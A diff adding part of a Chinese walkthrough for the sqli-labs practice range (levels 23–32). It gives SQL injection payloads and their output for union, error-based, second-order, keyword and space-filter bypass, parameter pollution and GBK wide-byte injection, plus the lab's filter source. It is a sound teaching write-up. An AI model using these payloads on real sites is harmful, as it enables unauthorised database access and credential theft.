@@ -3025,3 +3025,2122 @@ YWRtaW4xIiBhbmQgdXBkYXRleG1sICAoMSxjb25jYXQoMHg1Yywoc2VsZWN0IGdyb3VwX2NvbmNhdCh1
 最终爆破出数据
 
 ![Less-22_18](./img/Less-22_18.PNG)
+
+
+
+
+
+### level23
+
++ 正常注入
+
+~~~ shell
+?id=1'or '1' = '1
+~~~
+
+![Less-23-1](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-1.PNG)
+
+
+
+~~~ shell
+?id=-1' union select 1,database(),version() or '1'='1
+~~~
+
+![Less-23-2](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-2.PNG)
+
+
+
+~~~ shell
+?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" or '1'='1
+~~~
+
+![Less-23-3](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-3.PNG)
+
+~~~ text
+Welcome    Dhakkan
+Your Login name:2
+Your Password:innodb_table_stats,innodb_index_stats,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMNS_EXTENSIONS,COLUMN_STATISTICS,EVENTS,FILES,INNODB_DATAFILES,INNODB_FOREIGN,INNODB_FOREIGN_COLS,INNODB_FIELDS,INNODB_TABLESPACES_BRIEF,KEY_COLUMN_USAGE,KEYWORDS,PARAMETERS,PARTITIONS,REFERENTIAL_CONSTRAINTS,RESOURCE_GROUPS,ROUTINES,SCHEMATA,SCHEMATA_EXTENSIONS,ST_SPATIAL_REFERENCE_SYSTEMS,ST_UNITS_OF_MEASURE,ST_GEOMETRY_COLUMNS,STATISTICS,TABLE_CONSTRAINTS,TABLE_CONSTRAINTS_EXTENSIONS,TABLES,TABLES_EXTENSIONS,TABLESPACES_EXTENSIONS,TRIGGERS,VIEW_ROUTINE_USAGE,VIEW_TABLE_USAGE,VIEWS,COLUMN_PRIVILEGES,ENGINES,OPTIMIZER_TRACE,PLUGINS,PROCESSLIST,PROFILING,SCHEMA_PRIVILEGES,TABLESPACES,TABLE_PRIVILEGES,USER_PRIVILEGES,cond_instances,error_log,events_waits_current,events_waits_history,events_waits_history_long,events_waits_summary_by_host_by_event_name,events_waits_summary_by_instance,events_waits_summary_by_thread_by_event_name,events_waits_summary_by_user_by_event_name,events_wait
+~~~
+
+
+
+~~~ shell
+?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="FILES" or '1'='1
+~~~
+
+![Less-23-4](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-4.PNG)
+
+~~~ text
+Welcome    Dhakkan
+Your Login name:2
+Your Password:database_name,table_name,last_update,n_rows,clustered_index_size,sum_of_other_index_sizes,database_name,table_name,index_name,last_update,stat_name,stat_value,sample_size,stat_description,CHARACTER_SET_NAME,DEFAULT_COLLATE_NAME,DESCRIPTION,MAXLEN,CONSTRAINT_CATALOG,CONSTRAINT_SCHEMA,CONSTRAINT_NAME,CHECK_CLAUSE,COLLATION_NAME,CHARACTER_SET_NAME,ID,IS_DEFAULT,IS_COMPILED,SORTLEN,PAD_ATTRIBUTE,COLLATION_NAME,CHARACTER_SET_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,DATETIME_PRECISION,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT,GENERATION_EXPRESSION,SRS_ID,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ENGINE_ATTRIBUTE,SECONDARY_ENGINE_ATTRIBUTE,SCHEMA_NAME,TABLE_NAME,COLUMN_NAME,HISTOGRAM,EVENT_CATALOG,EVENT_SCHEMA,EVENT_NAME,DEFINER,TIME_ZONE,EVENT_BODY,EVENT_DEFINITION,EVENT_TYPE,EXECUTE_AT,INTERVAL_VALUE,INTERVAL_FIELD
+~~~
+
+
+
++ 在这一步不知道是什么问题，无法提取数据了，并报错
+
+~~~ shell
+?id=-1' union select group_concat(database_name) from FILES or '1'='1
+~~~
+
+![Less-23-8](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-8.PNG)
+
+~~~ text
+Welcome    Dhakkan
+
+Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in E:\phpstudy\phpstudy_pro\WWW\sqli-labs\Less-23\index.php on line 38
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or '1'='1' LIMIT 0,1' at line 1
+~~~
+
+
+
++ 重新换一个回显位，并重复以上的三项爆破，这次成功了
+
+~~~ shell
+?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="security"),3 or '1'='1
+~~~
+
+![Less-23-6](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-6.PNG)
+
+~~~ text
+Welcome    Dhakkan
+Your Login name:emails,referers,uagents,users
+Your Password:1
+~~~
+
+
+
+~~~ shell
+?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name="users" and table_schema="security"),3 or '1'='1
+~~~
+
+![Less-23-7](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-7.PNG)
+
+~~~text
+Welcome    Dhakkan
+Your Login name:id,password,username
+Your Password:1
+~~~
+
+
+
+
+
+~~~ shell
+?id=-1' union select 1,(select group_concat(username,password) from users),3 or '1'='1
+~~~
+
+![Less-23-5](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-23-5.PNG)
+
+~~~ text
+Welcome    Dhakkan
+Your Login name:DumbDumb,AngelinaI-kill-you,Dummyp@ssword,securecrappy,stupidstupidity,supermangenious,batmanmob!le,adminadmin,admin1admin1,admin2admin2,admin3admin3,dhakkandumbo,admin4admin4
+Your Password:1
+~~~
+
+
+
+### level24
+
+~~~ text
+第二十四关有一个登录页面和注册页面还要一个修改密码页面，该关卡使用得是二次注入，因为登录页面和注册页面对于密码和账户名都使用mysql_real_escape_string函数对于特殊字符进行转义。这里我们利用的是注册页面，因为虽然存在函数对特殊字符进行转义，但只是在调用sql语句时候进行转义，当注册成功后账户密码存在到数据库的时候是没有转义的，以原本数据存入数据库的。当我们修改密码的时候，对于账户名是没有进行过滤的。
+~~~
+
+![09682f62c14141b5ac76ac68f0e119b3](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/09682f62c14141b5ac76ac68f0e119b3.png)
+
+![e388adf190c942378903432e327bc822](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/e388adf190c942378903432e327bc822.png)
+
+
+
+首先我们看到管理员账户，admin，密码是admin,但是通常情况下我们是不知道密码的，只能猜测管理员账户的admin。我们先注册一个账号名叫<code>admin'#</code>。
+
+![bb41b4eaf6674a4c8c477764c40c51aa](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-3.PNG)
+
+
+
+我们先注册一个账号名叫<code>admin'#</code>。可以看到我们成功将有污染的数据写入数据库。**单引号是为了和之后密码修改的用户名的单引号进行闭合，#是为了注释后面的数据。**
+
+![Less-24-1](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-1.PNG)
+
+![5e342978e3b54ffc963764f8deb51beb](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-4.PNG)
+
+
+
+之后用户名admin'#和密码123456登录，进入修改密码页面。原始密码输入123456，新密码我输入的是111111，可以看到密码修改成功。
+
+![Less-24-2](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-5.PNG)
+
+![0a62e48c4af84c5b87204405aaaa86fa](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-6.PNG)
+
+![e5be9e28d556404ca90911d44f4ff881](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-7.PNG)
+
+![28a3d4e10def4be98a151bea907b8270](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/28a3d4e10def4be98a151bea907b8270.png)
+
+当我们数据库查看的时候发现修改的是管理员的密码。而不是我们的注册账户的密码。
+
+![ae806d5ca34d4b1990c78b1983e8a214](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-24-8.PNG)
+
+
+
+### level25
+
+![Less-25-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25-01.PNG)
+
+第二十五关根据提示是将or和and这两替换成空，但只替换一次。大小写绕过没有用则可用双写绕过并用联合注入，information里面涉及or可以写成infoorrmation，爆表名：
+
+~~~ shell
+?id=-2' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'--+
+~~~
+
+![Less-25-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25-02.PNG)
+
+
+
+爆数据列：
+
+~~~ shell
+?id=-2' union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users'--+
+~~~
+
+![Less-25-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25-03.PNG)
+
+
+
+password中含有or，写成passwoorrd，爆数据：
+
+~~~ shell
+?id=-2' union select 1,2,group_concat(passwoorrd,id,username) from users --+
+~~~
+
+![Less-25-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25-04.PNG)
+
+
+
+### level25a
+
+![Less-25a-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25a-01.PNG)
+
+同样的网站将or和and这两替换成空，但只替换一次。大小写绕过没有用则可用双写绕过并用联合注入，information里面涉及or可以写成infoorrmation，爆表名：
+
+~~~ shell
+?id=-2 union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'--+
+~~~
+
+![Less-25a-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25a-02.PNG)
+
+
+
+爆数据列：
+
+~~~ shell
+?id=-2 union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users'--+
+~~~
+
+![Less-25a-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25a-03.PNG)
+
+
+
+password中含有or，写成passwoorrd，爆数据：
+
+~~~ shell
+?id=-2 union select 1,2,group_concat(passwoorrd,id,username) from users --+
+~~~
+
+![Less-25a-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-25a-04.PNG)
+
+
+
+### level26
+
+第二十六关将逻辑运算符，注释符以及空格过滤了，用单引号闭合，双写绕过逻辑运算符或者用&&和||替换
+
+
+
+源码
+
+~~~ shell
+function blacklist($id)
+{
+    //过滤替换or
+    $id= preg_replace('/or/i',"", $id);	
+    //过滤替换and
+    $id= preg_replace('/and/i',"", $id);	
+    //过滤替换/*
+    $id= preg_replace('/[\/\*]/',"", $id);
+    //过滤替换--   （注释符一部分）
+    $id= preg_replace('/[--]/',"", $id);	
+    //过滤替换#    （注释符）
+    $id= preg_replace('/[#]/',"", $id);
+    //过滤替换\s      
+    //\s: 匹配一个空格符 等价于【\n\r\f\v\t】
+    $id= preg_replace('/[\s]/',"", $id);	
+    //过滤替换 /\
+    $id= preg_replace('/[\/\\\\]/',"", $id);	
+    return $id;
+}
+~~~
+
+
+
+常规代替空格的字符：
+
+~~~ shell
+%09 TAB 键（水平）
+%0a 新建一行
+%0b TAB 键（垂直）
+%0c 新的一页
+%0d return 功能
+%a0 空格
+~~~
+
+基本上把所有可替代空格的都过滤了。但是空格的作用还可以用括号代替。
+
+在windows和kali里面用不了，可能因为apache解析不了。只能用()绕过，报错注入空格使用比较少所以可用报错注入
+
+![Less-26-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26-01.PNG)
+
+
+
+再测一下闭合和回显位 【一个比较不常用的注释符`;%00`】
+
+~~~ shell
+?id=1'anandd'1'='1         回显正常
+?id=1';%00                 回显正常
+?id=1';%00--+              报错
+闭合是单引号
+
+----------------------------
+?id=1'union(select(1));%00                     报错
+?id=1'union(select(1),(2));%00                 报错
+?id=1'union(select(1),(2),(3));%00             回显正常
+回显位是3
+
+~~~
+
+所以这题用括号代替空格+报错注入
+
+
+
+爆表
+
+~~~ shell
+?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))||'0
+~~~
+
+![Less-26-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26-02.PNG)
+
+
+
+爆字段
+
+~~~ shell
+?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security'aandnd(table_name='users')))),1))||'0
+~~~
+
+![Less-26-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26-03.PNG)
+
+
+
+爆账号密码
+
+~~~ shell
+?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||'0
+~~~
+
+![Less-26-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26-04.PNG)
+
+
+
+
+
+### level26a
+
+这关和上一关有两个区别：
+
+1、不会爆出具体错误，用不了报错注入
+
+2、闭合是')
+
+
+
+![Less-26a-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26a-01.PNG)
+
+和上一关不同，不显示具体报错，导致无法报错注入
+
+![Less-26a-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26a-02.PNG)
+
+那就回归联合注入，闭合是单引号+括号`')'`
+
+
+
+爆表
+
+~~~ shell
+?id=1') ||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))|| ('0'='0
+~~~
+
+![Less-26a-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-26a-03.PNG)
+
+所幸sql语句正确和错误的时候网页回显是不同的，这关可以用布尔盲注。 
+
+具体代码先不写了，我不会。。。容后再写
+
+
+
+### level27
+
+第二十七关和第二十六关差不多，但二十七关没有过滤<code>and</code>和<code>or</code>而是过滤了<code>select</code>和<code>union</code>，可用大小写绕过和重写绕过
+
+![b1854f3aae1a4e58bb19fe9b5ef3966c](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/b1854f3aae1a4e58bb19fe9b5ef3966c.png)
+
+
+
+![Less-27-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27-01.PNG)
+
+
+
++ 爆数据表
+
+~~~ shell
+?id=1' or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema='security'))),1))or ' 0
+~~~
+
+![Less-27-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27-02.PNG)
+
+
+
++ 爆字段
+
+~~~ shell
+?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(column_name))from(information_schema.columns)where(table_schema='security'and(table_name='users')))),1))or'0
+~~~
+
+![Less-27-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27-03.PNG)
+
+
+
++ 爆数据
+
+~~~ shell
+?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users))),1))or'0
+~~~
+
+![Less-27-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27-04.PNG)
+
+
+
+### level27a
+
+该关双引号且页面不显示报错信息，过滤规则和二十七关一样，所以需要盲注和联合注入
+
+![Less-27a](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27a.PNG)
+
+
+
++ 爆表
+
+~~~ shell
+? id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'%0Aand"1
+~~~
+
+![Less-27a-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27a-01.PNG)
+
+
+
++ 爆列
+
+~~~ shell
+?id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(column_name)from%0Ainformation_schema.columns%0Awhere%0Atable_schema='security'%0Aand%0Atable_name='users'%0Aand"1
+~~~
+
+![Less-27a-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27a-02.PNG)
+
+
+
++ 爆账号密码
+
+~~~ shell
+?id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(password,id,username)from%0Ausers%0Awhere%0Aid=3%0Aand"1
+~~~
+
+![Less-27a-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-27a-03.PNG)
+
+
+
+
+
+### Less28
+
+这关过滤的是union select这个整体，源码如下：
+
+~~~ php
+$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
+$id= preg_replace('/[--]/',"", $id);				//Strip out --.
+$id= preg_replace('/[#]/',"", $id);					//Strip out #.
+$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
+$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
+$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
+~~~
+
+注释绕过参考23关，空格用%0a绕过，union select绕过也很简单直接将这个整体双写即可。需要注意的是这里没有报错提示。
+
+
+
+输入：
+
+~~~ php
+?id=2%27)%0aand%0a1=1;%00
+~~~
+
+![Less-28-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-01.png)
+
+
+
+继续输入:
+
+~~~ txt
+?id=2%27)%0aand%0a1=2;%00
+~~~
+
+![Less-28-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-02.png)
+
+
+
+输入:
+
+~~~ txt
+?id=2%27)%0aorder%0aby%0a3;%00
+~~~
+
+![Less-28-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-03.png)
+
+
+
+输入：
+
+~~~ txt
+?id=2%27)%0aorder%0aby%0a4;%00
+~~~
+
+![Less-28-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-04.png)
+
+
+
+输入：
+
+~~~ txt
+?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,3;%00
+~~~
+
+![Less-28-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-05.png)
+
+
+
+继续输入:
+
+~~~ txt
+?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,database();%00
+~~~
+
+![Less-28-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-06.png)
+
+
+
+继续输入
+
+~~~ txt
+?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security');%00
+~~~
+
+![Less-28-07](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-07.png)
+
+
+
+继续输入:
+
+~~~ txt
+?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='security'%0aand%0atable_name='users');%00
+~~~
+
+![Less-28-08](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-08.png)
+
+
+
+输入：
+
+~~~ txt
+?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(username,password)%0afrom%0ausers);%00
+~~~
+
+![Less-28-09](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28-09.png)
+
+
+
+其中’**%27**’可以被url解码为‘ **单引号**，而**%0a**被解码为**换行符**，而%00则被url解码为 **ASCII 值为0的字符**，即 **NUL（空字符）**
+
+
+
+### Less-28a
+
+~~~  txt
+?id=2%27)%0aand%0a1=1;%00
+~~~
+
+![Less-28a-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-01.png)
+
+
+
+继续输入
+
+~~~ txt
+?id=2%27)%0aand%0a1=2;%00
+~~~
+
+![Less-28a-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-02.png)
+
+
+
+输入
+
+~~~ txt
+?id=2%27)%0aorder%0aby%0a3;%00
+~~~
+
+![Less-28a-03](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-03.png)
+
+
+
+继续输入
+
+~~~ txt
+?id=2%27)%0aorder%0aby%0a4;%00
+~~~
+
+![Less-28a-04](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-04.png)
+
+
+
+输入
+
+~~~ txt
+?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,3;%00
+~~~
+
+![Less-28a-05](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-05.png)
+
+>  这关主要是过滤“union select”这段字符串
+
+
+
+继续输入
+
+~~~ txt
+?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,database();%00
+~~~
+
+![Less-28a-06](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-06.png)
+
+
+
+输入
+
+~~~ txt
+?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='security');%00
+~~~
+
+![Less-28a-07](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-07.png)
+
+
+
+继续输入
+
+~~~ txt
+?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='security'%0aand%0atable_name='users');%00
+~~~
+
+![Less-28a-07](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-08.png)
+
+
+
+输入
+
+~~~ txt
+?id=0%27)%0aunion%0aseunion%0aselectlect%0a1,2,(selECt%0agroup_concat(username,password)%0afrom%0ausers);%00
+~~~
+
+![Less-28a-09](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-28a-09.png)
+
+其中’**%27**’可以被url解码为‘ **单引号**，而**%0a**被解码为**换行符**，而%00则被url解码为 **ASCII 值为0的字符**，即 **NUL（空字符）**
+
+
+
+### Less-29
+
+二十九关就是会对输入的参数进行校验是否为数字，但是在对参数值进行校验之前的提取时候只提取了第一个id值，如果我们有两个id参数，第一个id参数正常数字，第二个id参数进行sql注入。sql语句在接受相同参数时候接受的是后面的参数值。
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/62a1679ce426d6884788a2ac7c418a37.png)
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/1a58d68dcdb85292609ec54be53708ce.png)
+
+所以用注入语句
+
+~~~ cmd
+?id=1&id=-1'--+
+~~~
+
+
+
+~~~ cmd
+?id=1&id=-1%27%20union%20select%201,2,3--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-29-01.png)
+
+
+
+~~~ cmd
+?id=1&id=-1%27%20union%20select%201,version(),database()--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-29-02.png)
+
+
+
+~~~ cmd
+?id=1&id=-1%27%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-29-03.png)
+
+
+
+~~~ cmd
+?id=1&id=-1%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-29-04.png)
+
+
+
+~~~ cmd
+?id=1&id=-1%27%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
+~~~
+
+![](./img/Less-29-05.png)
+
+
+
+### Less-30
+
+用注入语句，但是将单引号换成双引号
+
+~~~ cmd
+?id=1&id=0" --+
+~~~
+
+
+
+~~~ cmd
+?id=1&id=0" union select 1,2,3--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-30-01.png)
+
+
+
+~~~ cmd
+?id=1&id=0%22%20union%20select%201,version(),database()--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-30-02.png)
+
+
+
+~~~ cmd
+?id=1&id=0%22%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-30-03.png)
+
+
+
+~~~ cmd
+?id=1&id=0%22%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-30-04.png)
+
+
+
+~~~ cmd
+?id=1&id=0%22%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
+~~~
+
+![](.\img\Less-30-05.png)
+
+
+
+### Less-31
+
+和三十关差不多，多了一个括号，用注入指令
+
+~~~ cmd
+?id=1&id=-2")--+
+~~~
+
+
+
+~~~ cmd
+?id=1&id=-2")%20union%20select%201,2,3--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-31-01.png)
+
+
+
+~~~ cmd
+?id=1&id=-2")%20union%20select%201,database(),version()--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-31-02.png)
+
+
+
+~~~ cmd
+?id=1&id=-2%22)%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-31-03.png)
+
+
+
+~~~ cmd
+?id=1&id=-2%22)%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27--+
+~~~
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-31-04.png)
+
+
+
+~~~ cmd
+?id=1&id=-2%22)%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
+~~~
+
+![](.\img\Less-31-05.png)
+
+
+
+### Less-32
+
+> 使用preg_replace函数将 斜杠，单引号和双引号过滤了，如果输入id=1"会变成id=1\ ",使得引号不起作用，但是可以注意到数据库使用了gbk编码。这里我们可以采用宽字节注入。当某字符的大小为一个字节时，称其字符为窄字节；而当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节。
+
+![](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/56fab10e6769de000c045c580c36749f.png)
+
+~~~ cmd
+?id=1%df%27 --+
+~~~
+
+
+
+sqli-lib-32 宽字节注入
+
+> mysql默认是GBK编码，GBK汉字编码，两个字节代表一个汉字，一个字节代表一个英文或者数字。那么，两个字节就是宽字节，一个字节就是窄字节
+
+
+
+漏洞出现原因
+
+> mysql默认使用BGK编码，当mysql使用bgk编码时，会认为两个字符是一个汉字，(前一个ASCII码要大于128，才会得到汉字范围)，这就是mysql的特性，因为BGK是多字节编码，它认为两个字节是一个汉字，我们在代入参数时，代入 %df%27，%27 是 单引号 的url编码
+
+~~~ php
+# 当 我们进行 SQL注入时，会进行一下操作
+    
+    （1）?id=1' and 1=1%23
+    	# 这是正常的语句，我们不放使用SQL语句看一下
+    	select * from user where id='1' and 1=1#'
+    	
+    	# 当php使用函数对接受的参数做了处理后，将单引号转义，在单引号前面加上了 转义符“\"
+    	在sql中的语句是：
+    	select * from user where id='1\' and 1=1#'
+    	# 这时代入数据库查看,这是明显没有注入成功的，因为前面的单引号没有闭合
+  
+  
+    (2) 当我们代入了 %df 时，在数据库中就变成了
+    	?id=1%DF' and 1=1%23
+    	这时，转义函数，还会对我们输入的单引号进行转义，转义成（\'）,而"\"的url编码为 %5C
+    	在url中就变成了：%DF%5c%27
+    	当编码为bgk时，%5c会和前面的%df拼合，形成一个汉字（運）
+    	从而闭合掉了后面的引号，查询成功
+    	
+    	最后的sql语句是：
+    	select * from user where id='1運' and 1=1#'
+~~~
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,2,3--+
+~~~
+
+![Less-32-01](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-32-01.png)
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
+~~~
+
+![Less-32-02](D:/ShootRange/LingJing/TargetedPractice/sqli-labs/sql-labs通关/img/Less-32-02.png)
+
+
+
+~~~ cmd
+?id=-1%df%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273--+
+~~~
+
